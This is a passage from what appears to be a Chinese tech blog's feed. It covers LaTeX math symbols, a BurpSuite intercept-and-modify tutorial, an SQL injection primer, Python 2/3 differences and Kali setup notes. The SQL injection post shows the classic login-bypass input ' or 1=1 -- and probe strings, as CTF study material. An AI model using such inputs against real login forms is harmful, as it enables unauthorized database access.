y$</li><li>真子集运算，符号：<code>\supseteq</code>，如：$x \supseteq y$</li><li>非真子集运算，符号：<code>\supsetneq</code>，如：$x \supsetneq y$</li><li>非子集运算，符号：<code>\not\subset</code>，如：$x \not\subset y$</li><li>非子集运算，符号：<code>\not\supset</code>，如：$x \not\supset y$</li><li>并集运算，符号：<code>\cup</code>，如：$x \cup y$</li><li>交集运算，符号：<code>\cap</code>，如：$x \cap y$</li><li>差集运算，符号：<code>\setminus</code>，如：$x \setminus y$</li><li>同或运算，符号：<code>\bigodot</code>，如：$x \bigodot y$</li><li>同与运算，符号：<code>\bigotimes</code>，如：$x \bigotimes y$</li><li>实数集合，符号：<code>\mathbb&#123;R&#125;</code>，如：$\mathbb{R}$</li><li>自然数集合，符号：<code>\mathbb&#123;Z&#125;</code>，如：$\mathbb{Z}$</li><li>空集，符号：<code>\emptyset</code>，如：$\emptyset$</li></ol><h3 id="数学符号"><a href="#数学符号" class="headerlink" title="数学符号"></a>数学符号</h3><ol><li>无穷，符号：<code>\infty</code>，如：$\infty$</li><li>虚数，符号：<code>\imath</code>，如：$\imath$</li><li>虚数，符号：<code>\jmath</code>，如：$\jmath$</li><li>虚数，符号：<code>\prime</code>，如：$\prime$</li><li>数学符号，符号<code>\hat&#123;a&#125;</code>，如：$\hat{a}$</li><li>数学符号，符号<code>\check&#123;a&#125;</code>，如：$\check{a}$</li><li>数学符号，符号<code>\breve&#123;a&#125;</code>，如：$\breve{a}$</li><li>数学符号，符号<code>\tilde&#123;a&#125;</code>，如：$\tilde{a}$</li><li>数学符号，符号<code>\bar&#123;a&#125;</code>，如：$\bar{a}$</li><li>矢量符号，符号<code>\vec&#123;a&#125;</code>，如：$\vec{a}$</li><li>数学符号，符号<code>\acute&#123;a&#125;</code>，如：$\acute{a}$</li><li>数学符号，符号<code>\grave&#123;a&#125;</code>，如：$\grave{a}$</li><li>数学符号，符号<code>\mathring&#123;a&#125;</code>，如：$\mathring{a}$</li><li>一阶导数符号，符号<code>\dot&#123;a&#125;</code>，如：$\dot{a}$</li><li>二阶导数符号，符号<code>\ddot&#123;a&#125;</code>，如：$\ddot{a}$</li><li>上箭头，符号：<code>\uparrow</code>，如：$\uparrow$</li><li>上箭头，符号：<code>\Uparrow</code>，如：$\Uparrow$</li><li>下箭头，符号：<code>\downarrow</code>，如：$\downarrow$</li><li>下箭头，符号：<code>\Downarrow</code>，如：$\Downarrow$</li><li>左箭头，符号：<code>\leftarrow</code>，如：$\leftarrow$</li><li>左箭头，符号：<code>\Leftarrow</code>，如：$\Leftarrow$</li><li>右箭头，符号：<code>\rightarrow</code>，如：$\rightarrow$</li><li>右箭头，符号：<code>\Rightarrow</code>，如：$\Rightarrow$</li><li>底端对齐的省略号，符号：<code>\ldots</code>，如：$1,2,\ldots,n$</li><li>中线对齐的省略号，符号：<code>\cdots</code>，如：$x_1^2 + x_2^2 + \cdots + x_n^2$</li><li>竖直对齐的省略号，符号：<code>\vdots</code>，如：$\vdots$</li><li>斜对齐的省略号，符号：<code>\ddots</code>，如：$\ddots$</li></ol><h3 id="希腊字母"><a href="#希腊字母" class="headerlink" title="希腊字母"></a>希腊字母</h3><div class="table-container"><table><thead><tr><th>字母</th><th>代码</th><th>字母</th><th>代码</th></tr></thead><tbody><tr><td>A</td><td><code>A</code></td><td>α</td><td><code>\alpha</code></td></tr><tr><td>B</td><td><code>B</code></td><td>β</td><td><code>\beta</code></td></tr><tr><td>Γ</td><td><code>\Gamma</code></td><td>γ</td><td><code>\gamma</code></td></tr><tr><td>Δ</td><td><code>\Delta</code></td><td>δ</td><td><code>\delta</code></td></tr><tr><td>E</td><td><code>E</code></td><td>ϵ</td><td><code>\epsilon</code></td></tr><tr><td>Z</td><td><code>Z</code></td><td>ζ</td><td><code>\zeta</code></td></tr><tr><td>H</td><td><code>H</code></td><td>η</td><td><code>\eta</code></td></tr><tr><td>Θ</td><td><code>\Theta</code></td><td>θ</td><td><code>\theta</code></td></tr><tr><td>I</td><td><code>I</code></td><td>ι</td><td><code>\iota</code></td></tr><tr><td>K</td><td><code>K</code></td><td>κ</td><td><code>\kappa</code></td></tr><tr><td>Λ</td><td><code>\Lambda</code></td><td>λ</td><td><code>\lambda</code></td></tr><tr><td>M</td><td><code>M</code></td><td>μ</td><td><code>\mu</code></td></tr><tr><td>N</td><td><code>N</code></td><td>ν</td><td><code>\nu</code></td></tr><tr><td>Ξ</td><td><code>\Xi</code></td><td>ξ</td><td><code>\xi</code></td></tr><tr><td>O</td><td><code>O</code></td><td>ο</td><td><code>\omicron</code></td></tr><tr><td>Π</td><td><code>\Pi</code></td><td>π</td><td><code>\pi</code></td></tr><tr><td>P</td><td><code>P</code></td><td>ρ</td><td><code>\rho</code></td></tr><tr><td>Σ</td><td><code>\Sigma</code></td><td>σ</td><td><code>\sigma</code></td></tr><tr><td>T</td><td><code>T</code></td><td>τ</td><td><code>\tau</code></td></tr><tr><td>Υ</td><td><code>\Upsilon</code></td><td>υ</td><td><code>\upsilon</code></td></tr><tr><td>Φ</td><td><code>\Phi</code></td><td>ϕ</td><td><code>\phi</code></td></tr><tr><td>X</td><td><code>X</code></td><td>χ</td><td><code>\chi</code></td></tr><tr><td>Ψ</td><td><code>\Psi</code></td><td>ψ</td><td><code>\psi</code></td></tr><tr><td>Ω</td><td><code>\Omega</code></td><td>ω</td><td><code>\omega</code></td></tr><tr><td></td><td></td><td>ε</td><td><code>\varepsilon</code></td></tr></tbody></table></div><h3 id="编号"><a href="#编号" class="headerlink" title="编号"></a>编号</h3><script type="math/tex; mode=display">e^{i\theta}=\cos \theta+\sin \theta i \tag{1}</script><h3 id="矩阵"><a href="#矩阵" class="headerlink" title="矩阵"></a>矩阵</h3><p><strong>不带括号的矩阵</strong></p><p>格式如下：</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs markdown">$$<br>\begin&#123;matrix&#125;<br>1 &amp; 2 &amp; 3 \\<br>4 &amp; 5 &amp; 6 \\<br>7 &amp; 8 &amp; 9 <br>\end&#123;matrix&#125;<br>\tag&#123;1&#125;<br>$$<br></code></pre></td></tr></table></figure><p>效果如下：</p><script type="math/tex; mode=display">\begin{matrix}1 & 2 & 3 \\4 & 5 & 6 \\7 & 8 & 9 \end{matrix}\tag{1}</script><p><strong>带括号的矩阵</strong></p><p>格式如下：</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs markdown">$$<br>\left[<br>\begin&#123;matrix&#125;<br>1 &amp; 2 &amp; 3 \\<br>4 &amp; 5 &amp; 6 \\<br>7 &amp; 8 &amp; 9 <br>\end&#123;matrix&#125;<br>\right]<br>\tag&#123;2&#125;<br>$$<br></code></pre></td></tr></table></figure><p>效果如下：</p><script type="math/tex; mode=display">\left[\begin{matrix}1 & 2 & 3 \\4 & 5 & 6 \\7 & 8 & 9 \end{matrix}\right]\tag{2}</script><p>格式如下：</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs markdown">$$<br>\begin&#123;bmatrix&#125;<br>1 &amp; 2 &amp; 3 \\<br>4 &amp; 5 &amp; 6 \\<br>7 &amp; 8 &amp; 9 <br>\end&#123;bmatrix&#125;<br>\tag&#123;2&#125;<br>$$<br></code></pre></td></tr></table></figure><p>效果如下：</p><script type="math/tex; mode=display">\begin{bmatrix}1 & 2 & 3 \\4 & 5 & 6 \\7 & 8 & 9 \end{bmatrix}\tag{2}</script><div class="table-container"><table><thead><tr><th>符号</th><th>形式</th></tr></thead><tbody><tr><td>pmatrix</td><td>(1234)</td></tr><tr><td>bmatrix</td><td>[1234]</td></tr><tr><td>Bmatrix</td><td>{1234}</td></tr><tr><td>vmatrix</td><td>\</td><td>1234\</td><td></td></tr><tr><td>Vmatrix</td><td>\</td><td>\</td><td>1 3 2 4\</td><td>\</td></tr></tbody></table></div><h3 id="分段函数"><a href="#分段函数" class="headerlink" title="分段函数"></a>分段函数</h3><p>格式如下：</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs markdown">$$<br>函数名=<br>\begin&#123;cases&#125;<br>公式1 &amp; 条件1 \\<br>公式2 &amp; 条件2 \\<br>公式3 &amp; 条件3 <br>\end&#123;cases&#125;<br>$$<br></code></pre></td></tr></table></figure><p>其中， <code>&amp;</code> 表示对齐， <code>\\</code> 用来表示换行 。</p><p>效果如下：</p><script type="math/tex; mode=display">函数名=\begin{cases}公式1 & 条件1 \\公式2 & 条件2 \\公式3 & 条件3 \end{cases}</script><details>  <summary> 点击此区域标题：查看详细内容 </summary>  <p> - 测试文本段落 </p>  <pre><code>  title，value，callBack可以缺省  </code>  </pre></details><h2 id="Markdown流程图"><a href="#Markdown流程图" class="headerlink" title="Markdown流程图"></a>Markdown流程图</h2>]]></content>
    
    
    <categories>
      
      <category>Markdown</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Markdown</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>BurpSuite</title>
    <link href="/2021/08/17/CTF/Web/Tools/BurpSuite/"/>
    <url>/2021/08/17/CTF/Web/Tools/BurpSuite/</url>
    
    <content type="html"><![CDATA[<p>（推荐使用 <strong>FoxyProry</strong> 进行代理，相当好用）</p><h2 id="Burpsuite神奇常用功能使用方法总结"><a href="#Burpsuite神奇常用功能使用方法总结" class="headerlink" title="Burpsuite神奇常用功能使用方法总结"></a>Burpsuite神奇常用功能使用方法总结</h2><p>Burpsuite介绍：</p><p>一款可以进行再WEB应用程序的集成攻击测试平台。(抓https要在浏览器中导入证书)</p><h3 id="1、学习Proxy"><a href="#1、学习Proxy" class="headerlink" title="1、学习Proxy"></a>1、学习Proxy</h3><p> <img src="https://img2018.cnblogs.com/blog/1194057/201904/1194057-20190415160104503-1695107907.png" alt="img"></p><p>首先看标红，intercept is on 为拦截状态 其对应的intercept is off 为非拦截状态,设置完代理后打开拦截状态，浏览器发起的请求会被burpsuite所拦截</p><p> <img src="https://img2018.cnblogs.com/blog/1194057/201904/1194057-20190415160113915-1680360524.png" alt="img"></p><p>forward: 进行请求后被拦截，点击forward可以继续此次请求，如果你点击drop则丢弃此请求数据。继续请求后能够看到返回结果</p><p> <img src="https://img2018.cnblogs.com/blog/1194057/201904/1194057-20190415160120925-1705436205.png" alt="img"></p><p>可以在消息分析选项卡查看这次请求的所有内容</p><p>1）Raw 这个视图主要显示web请求的raw格式，包含请求地址， http协议版本， 主机头， 浏览器信息，accept可接受的内容类型，字符集，编码方式，cookies等,  可以手动修改这些内容，然后在点击forward进行渗透测试</p><p>2） params 这个视图主要是显示客户端请求的参数信息，get或者post的参数，cookies参数，也可以修改</p><p>3）headers是头部信息和Raw其实差不多，展示更直观</p><p>4）Hex 这个视图显示Raw的二进制内容</p><p>注意： 默认情况下，BurpProxy只拦截请求的消息，普通的文件如css,js,图片是不会拦截的，当然，想拦截什么都可以设置,我们现在知道了怎么设置代理，怎么安装，怎么进行请求拦截，怎么修改请求发起的内容向服务端进行渗透，接下来我们学习一下怎么控制这些拦截</p><p> <img src="https://img2018.cnblogs.com/blog/1194057/201904/1194057-20190415160131806-1628996900.png" alt="img"></p><p>上图为http history 所有拦截的历史均会被记录起来</p><p> <img src="https://img2018.cnblogs.com/blog/1194057/201904/1194057-20190415160139665-729908590.png" alt="img"></p><p>Burp Proxy的拦截功能主要由Intercept选项卡中的Forward、Drop、Interception is on/off、Action构成，它们的功能分别是： Forward的功能是当你查看过消息或者重新编辑过消息之后，点击此按钮，将发送消息至服务器端。 Drop的功能是你想丢失当前拦截的消息，不再forward到服务器端。Interception is on表示拦截功能打开，拦截所有通过Burp Proxy的请求数据；Interception is off表示拦截功能关闭，不再拦截通过Burp Proxy的所有请求数据。 Action的功能是除了将当前请求的消息传递到Spider、Scanner、Repeater、Intruder、Sequencer、Decoder、Comparer组件外，还可以做一些请求消息的修改，如改变GET或者POST请求方式、改变请求body的编码，同时也可以改变请求消息的拦截设置，如不再拦截此主机的消息、不再拦截此IP地址的消息、不再拦截此种文件类型的消息、不再拦截此目录的消息，也可以指定针对此消息拦截它的服务器端返回消息。                                                      </p><h3 id="2、burpsuite使用（抓包、截包、改包）"><a href="#2、burpsuite使用（抓包、截包、改包）" class="headerlink" title="2、burpsuite使用（抓包、截包、改包）"></a>2、burpsuite使用（抓包、截包、改包）</h3><p>这里推荐火狐浏览器来配合burp使用。</p><h4 id="1）设置浏览器"><a href="#1）设置浏览器" class="headerlink" title="1）设置浏览器"></a>1）设置浏览器</h4><p>工具-选项-网络设置-设置，将连接设置改为手动代理配置</p><p><img src="https://img2018.cnblogs.com/blog/1194057/201904/1194057-20190415160150670-1031551237.png" alt="img"></p><p>输入127.0.0.1:8080，点击回车，进入burp证书下载页面</p><p> <img src="https://img2018.cnblogs.com/blog/1194057/201904/1194057-20190415160155678-504532104.png" alt="img"></p><p>点击右上角，下载证书</p><p> <img src="https://img2018.cnblogs.com/blog/1194057/201904/1194057-20190415160201159-1809790672.png" alt="img"></p><p>在选项里搜索证书，点击【查看证书】</p><p> <img src="https://img2018.cnblogs.com/blog/1194057/201904/1194057-20190415160207200-175891539.png" alt="img"></p><p>点击【导入】，导入刚刚下载的burp证书，这样就可以使用burp抓取https请求了</p><p> <img src="https://img2018.cnblogs.com/blog/1194057/201904/1194057-20190415160216204-41674101.png" alt="img"></p><p>这时候计算机上的火狐浏览器也设置为了代理模式。代理设置成功之后，访问网页是访问不了的，因为我们没有将请求转发，接下来就需要配置burp来转发浏览器的请求。</p><h4 id="2）配置burp监听端口"><a href="#2）配置burp监听端口" class="headerlink" title="2）配置burp监听端口"></a>2）配置burp监听端口</h4><p>然后打开burp</p><p> <img src="https://img2018.cnblogs.com/blog/1194057/201904/1194057-20190415160225830-953931912.png" alt="img"></p><p>在监听的端口设置与代理的端口相同</p><h4 id="3）抓包"><a href="#3）抓包" class="headerlink" title="3）抓包"></a>3）抓包</h4><p> 将burp设置为Intercept is on，在火狐浏览器里输入baike.baidu.com</p><p> <img src="https://img2018.cnblogs.com/blog/1194057/201904/1194057-20190415160240235-13829037.png" alt="img"></p><p>将Intercept is on设置为Intercept is off</p><p> <img src="https://img2018.cnblogs.com/blog/1194057/201904/1194057-20190415160257914-1241773243.png" alt="img"></p><h4 id="4）截包"><a href="#4）截包" class="headerlink" title="4）截包"></a>4）截包</h4><p>这时候就需要打开拦截功能了</p><p>之前在抓包的时候可以看到，百度搜索一次要发送很多个请求，这个时候停留在第一个请求上面，这时候，如果不听地点击forward的话，就会一直发送接下来的请求。如果不停点击drop，就会把这些请求的包一个个丢掉。</p><h4 id="5）改包"><a href="#5）改包" class="headerlink" title="5）改包"></a>5）改包</h4><p>比如水果网<a href="http://www.guo68.com/搜索水果：pingguo（搜索中文的时候抓的包是乱码，不利观察）">http://www.guo68.com/搜索水果：pingguo（搜索中文的时候抓的包是乱码，不利观察）</a></p><p>一直点击forward，并且查看params选项，直到参数的内容中出现pingguo</p><p> <img src="https://img2018.cnblogs.com/blog/1194057/201904/1194057-20190415160313306-2042683578.png" alt="img"></p><p>这时候把pingguo改成putao，继续点击forward或者关闭拦截功能。</p><p> <img src="https://img2018.cnblogs.com/blog/1194057/201904/1194057-20190415160321035-1828655767.png" alt="img"></p><p>便会搜索putao了。</p>]]></content>
    
    
    <categories>
      
      <category>BurpSuite</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>Web</tag>
      
      <tag>BurpSuite</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SQL注入</title>
    <link href="/2021/08/14/CTF/Web/Notes/SQL%E6%B3%A8%E5%85%A5/"/>
    <url>/2021/08/14/CTF/Web/Notes/SQL%E6%B3%A8%E5%85%A5/</url>
    
    <content type="html"><![CDATA[<h1 id="0x01-SQL注入原理"><a href="#0x01-SQL注入原理" class="headerlink" title="0x01 SQL注入原理"></a>0x01 SQL注入原理</h1><p>在与用户交互的程序中，用户的输入拼接到 SQL 语句中，执行了与原定计划不同的行为，从而产生了 SQL 注入漏洞 。</p><p>登录 SQL 语句：</p><p>select * from admin where username = ‘用户输入的用户名’ and password = ‘用户输入的密码’ </p><p>用户输入的内客可由用户自行控制，例如可以愉入 ‘ or 1=1 — 空格</p><p>SQL 语句：</p><p>select * from admin where username = ‘’ or 1=1 — ‘ and password = ‘用户输入的密码’ </p><p>其中 or 1=1 永远为真，—注释后边内容不再执行，因此 SQL 语句执行会返回 admin 表中的所有内容 。</p><p>Burp Suite 万能密码爆破</p><p>SQL注入验证：</p><ul><li>单引号 ‘</li><li>and 1=1</li><li>and 1=2</li></ul><p>如果页面中 MySQL 报错，证明该页面存在 SQL 注入漏洞 。</p><p>Sqlmap 是检测和利用 SQL 注入漏洞的一款强大工具 。</p><p>一、什么是 SQL 注入</p><p>所谓 SQL 注入，就是通过把 SQL 命令插入到 Web 表单递交或输入域名或页面请求的查询字符串，最终达到欺骗服务器执行恶意的 SQL 命令。</p><p>一、什么是 SQL 注入</p><p>SQL 注入是比较常见的网络攻击方式之一，它不是利用操作系统的 BUG 来实现攻击，而是针对程序员编写时的疏忽，通过 SQL 语句，实现无账号登录，甚至篡改数据库。</p><p>二、SQL注入攻击的总体思路</p><p>1、寻找到 SQL 注入的位置</p><p>2、判断服务器类型和后台数据库类型</p><p>3、针对不同的服务器和数据库特点进行 SQL 注入攻击</p>]]></content>
    
    
    <categories>
      
      <category>SQL</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Web</tag>
      
      <tag>SQL</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Python版本区别</title>
    <link href="/2021/08/10/Code/Python/Python%E7%89%88%E6%9C%AC%E5%8C%BA%E5%88%AB/"/>
    <url>/2021/08/10/Code/Python/Python%E7%89%88%E6%9C%AC%E5%8C%BA%E5%88%AB/</url>
    
    <content type="html"><![CDATA[<h1 id="Python版本区别"><a href="#Python版本区别" class="headerlink" title="Python版本区别"></a>Python版本区别</h1><h2 id="1、except"><a href="#1、except" class="headerlink" title="1、except"></a>1、except</h2><p><strong>报错：</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">except Exception, e:  SyntaxError: invalid syntax<br></code></pre></td></tr></table></figure><p>出这个问题是因为 <code>python2</code> 和 <code>python3</code> 处理 <code>except</code> 子句的语法有点不同 。</p><p><code>Python2</code>：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">try</span>:<br>    <span class="hljs-built_in">print</span> (<span class="hljs-string">&quot;hello world&quot;</span>)<br><span class="hljs-keyword">except</span> ZeroDivisionError, err:　　<span class="hljs-comment"># , 加原因参数名称</span><br>    <span class="hljs-built_in">print</span> (<span class="hljs-string">&#x27;Exception: &#x27;</span>, err)<br></code></pre></td></tr></table></figure><p><code>Python3</code>：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">try</span>:<br>    <span class="hljs-built_in">print</span> (<span class="hljs-string">&quot;hello,world&quot;</span>)<br><span class="hljs-keyword">except</span> ZeroDivisionError <span class="hljs-keyword">as</span> err:  <span class="hljs-comment"># as 加原因参数名称</span><br>    <span class="hljs-built_in">print</span> (<span class="hljs-string">&#x27;Exception: &#x27;</span>, err)<br></code></pre></td></tr></table></figure><p>如果要兼容的话似乎 <code>as</code> 可以 。</p><h2 id="2、打印"><a href="#2、打印" class="headerlink" title="2、打印"></a>2、打印</h2><p><strong>问题：</strong></p><p>在 <code>python3</code> 中，单字节 <code>\xd0</code> 以两个字节的序列 <code>\xc3\x90</code> 打印</p><p>我试图在 <code>python3</code> 中将字节 <code>d0</code> 打印到 <code>stdout</code> 。为什么它不输出字节 <code>\xd0</code> ？</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ python3 -c <span class="hljs-string">&#x27;print(&quot;\xd0&quot;, end = &quot;&quot;)&#x27;</span> | xxd<br>00000000: c390<br>$ python3 -c <span class="hljs-string">&#x27;print(&quot;\xd0&quot;)&#x27;</span> | xxd<br>00000000: c390 0a<br>$ python -c <span class="hljs-string">&#x27;print(&quot;\xd0&quot;)&#x27;</span> | xxd<br>00000000: d00a<br></code></pre></td></tr></table></figure><p><code>&quot;\xd0&quot;</code> 是一个 <code>str</code> 对象，在 <code>python3</code> 中，它是一个 Unicode字符串（=Unicode码点序列），包含Unicode码点U+00D0（即208，即Ð）；当用 <code>print</code> 写入时，Python 必须将其从 Unicode（str）转换为字节（bytes），因此它必须使用编码（“抽象码点”到字节转换器）。</p><p>在您的例子中，通常是 UTF-8，其中代码点 U+00D0 被编码为代码单元（=bytes）序列 <code>c390</code> 。</p><p>如果您想按字面意思输出一个字节 <code>0xd0</code> ，您必须使用一个字节字符串并直接转到超出 <code>sys.stdout</code> 的字节流：</p><p>它将字符 <code>U+00D0（“Ð”）</code> 打印为 <code>UTF-8</code> 。如果要将字节字符串输出到 <code>stdout</code>，请使用 <code>sys.stdout.buffer</code> ：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> sys<br>sys.stdout.buffer.write(<span class="hljs-string">b&#x27;\xd0&#x27;</span>)<br></code></pre></td></tr></table></figure><p><code>&quot;\xd0&quot;</code> 是 Unicode码点字符串，<code>b&quot;\xd0&quot;</code> 是字节字符串 。</p><h2 id="3、HTTP服务"><a href="#3、HTTP服务" class="headerlink" title="3、HTTP服务"></a>3、HTTP服务</h2><p>最近写论文mac和windows共享文件好累</p><p>想着用</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">python -m SimpleHTTPServer  端口号<br></code></pre></td></tr></table></figure><p>结果一直报错</p><figure class="highlight fortran"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs fortran">No <span class="hljs-keyword">module</span> <span class="hljs-keyword">named</span> simplehttpserver<br></code></pre></td></tr></table></figure><p>后来发现 <code>python3</code> 已经改成了 <code>http.server</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">python -m http.server 端口号<br></code></pre></td></tr></table></figure><p>真的 <code>py2</code> 和 <code>py3</code> 是两种语言的感觉</p><p>原文链接：<a href="https://blog.csdn.net/hotpotbo/article/details/88227301">https://blog.csdn.net/hotpotbo/article/details/88227301</a></p>]]></content>
    
    
    <categories>
      
      <category>Python</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Python</tag>
      
      <tag>Code</tag>
      
      <tag>Version</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Kali切换Python版本</title>
    <link href="/2021/08/09/Linux/Kali/Kali%E5%88%87%E6%8D%A2Python%E7%89%88%E6%9C%AC/"/>
    <url>/2021/08/09/Linux/Kali/Kali%E5%88%87%E6%8D%A2Python%E7%89%88%E6%9C%AC/</url>
    
    <content type="html"><![CDATA[<blockquote><p><a href="https://cloud.tencent.com/developer/article/1532283">update-alternatives—linux软件版本管理命令 - 腾讯云开发者社区</a></p></blockquote><p>在 <code>Kali</code> 中安装了 <code>python2</code> 和 <code>python3</code> ，默认使用<code>python2</code>，可以使用如下方式切换默认版本 。</p><p>从 <code>python2</code> 切换到 <code>python3</code> ：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> update-alternatives --install /usr/bin/python python /usr/bin/python2 100</span><br>update-alternatives: 使用 /usr/bin/python2 来在自动模式中提供 /usr/bin/python (python)<br><span class="hljs-meta">#</span><span class="bash"> update-alternatives --install /usr/bin/python python /usr/bin/python3 150</span><br>update-alternatives: 使用 /usr/bin/python3 来在自动模式中提供 /usr/bin/python (python)<br><span class="hljs-meta">#</span><span class="bash"> python --version</span><br>Python 3.7.6<br></code></pre></td></tr></table></figure><p>切换 <code>python</code> 版本后，若要使用 <code>pip</code> 可能会出现找不到 <code>pip</code> 模块的问题，这时我们需要重新安装 <code>pip3</code> ：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> apt-get install python3-pip</span><br><span class="hljs-meta">#</span><span class="bash"> pip --version</span><br>pip 20.2.3 from usr/lib/python3/dist-packages/pip (python 3.8)<br></code></pre></td></tr></table></figure><p>需要重新修改回 <code>python2</code> ，可使用命令：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> update-alternatives --config python</span><br></code></pre></td></tr></table></figure><p>选择相应编号，确定 <code>python</code> 版本 。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> update-alternatives --config python</span><br>有 2 个候选项可用于替换 python （提供 /usr/lib/python）。<br><br> 选择        路径          优先级     状态<br>------------------------------------------------<br>* 0    /usr/bin/python3    150    自动模式<br>  1    /usr/bin/python2    100    手动模式<br>  2    /usr/bin/python3    150    手动模式<br><br>要维持当前值[*]请按&lt;回车腱&gt;，或者键入选择的编号 : 1<br>update-alternatives：使用 /usr/bin/python2 来在手动模式中提供 /usr/bin/python (python)<br><span class="hljs-meta">#</span><span class="bash"> python --version</span><br>Python 2.7.6<br><span class="hljs-meta">#</span><span class="bash"> pip --version</span><br>pip 20.2.3 from usr/lib/python3/dist-packages/pip (python 3.8)<br></code></pre></td></tr></table></figure><p>以后就可以通过命令 <code>update-alternatives --config python</code> 来切换 <code>python</code> 版本了 。</p>]]></content>
    
    
    <categories>
      
      <category>Kali</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Linux</tag>
      
      <tag>Python</tag>
      
      <tag>Kali</tag>
      
      <tag>版本管理</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Kali安装tesseract</title>
    <link href="/2021/08/09/Linux/Kali/Kali%E5%AE%89%E8%A3%85tesseract/"/>
    <url>/2021/08/09/Linux/Kali/Kali%E5%AE%89%E8%A3%85tesseract/</url>
    
    <content type="html"><![CDATA[<h2 id="Kali-linux-下安装-pytesseract-和-tesseract-ocr"><a href="#Kali-linux-下安装-pytesseract-和-tesseract-ocr" class="headerlink" title="Kali linux 下安装 pytesseract 和 tesseract-ocr"></a>Kali linux 下安装 pytesseract 和 tesseract-ocr</h2><blockquote><p>原文链接：<a href="https://blog.csdn.net/li_ellin/article/details/110522005">https://blog.csdn.net/li_ellin/article/details/110522005</a></p><p>未成功</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> sudo add-apt-repository ppa:alex-p/tesseract-ocr</span><br><span class="hljs-meta">$</span><span class="bash"> sudo apt-get update</span><br><span class="hljs-meta">#</span><span class="bash"> 安装OCR引擎</span><br><span class="hljs-meta">$</span><span class="bash"> sudo apt-get install tesseract-ocr</span><br><span class="hljs-meta">#</span><span class="bash"> 安装训练数据(equ为数学公式包)</span><br><span class="hljs-meta">$</span><span class="bash"> sudo apt-get install tesseract-ocr-eng tesseract-ocr-chi-sim  tesseract-ocr-equ</span><br><span class="hljs-meta">#</span><span class="bash"> 可选安装Leptonica</span><br><span class="hljs-meta">$</span><span class="bash"> sudo apt-get install liblept5  libleptonica-dev</span><br><span class="hljs-meta">$</span><span class="bash"> sudo pip3 install pytesseract</span><br></code></pre></td></tr></table></figure><p>pytesseract是 google 做的 ocr 库，可以识别图片中的文字 。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span 